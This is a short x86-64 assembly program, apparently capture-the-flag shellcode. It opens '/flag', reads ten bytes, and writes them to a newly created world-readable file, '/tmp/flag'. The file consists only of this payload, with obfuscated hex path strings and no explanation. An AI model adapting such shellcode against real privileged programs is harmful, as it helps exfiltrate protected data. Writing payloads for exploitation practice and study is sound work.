.intel_syntax noprefix
.global _start
.text
_start:
        xor rax, rax
        push rax
        mov rbx, 0x67616c662f
        push rbx

        mov rdi,rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 2
        syscall

        mov rdi, rax
        mov rax, 0
        mov rsi, rsp
        mov r12, rsi
        mov rdx, 10
        syscall

        mov rbx, 0x0067
        push rbx
        mov rbx, 0x616c662f706d742f
        push rbx

        mov rdi, rsp
        mov rax, 2
        mov rsi, 0x41
        mov rdx, 511
        syscall

        mov rdi, rax
        mov rsi, r12
        mov rdx, 10
        mov rax, 1
        syscall

        mov rdi, 0
        mov rax, 60
        syscall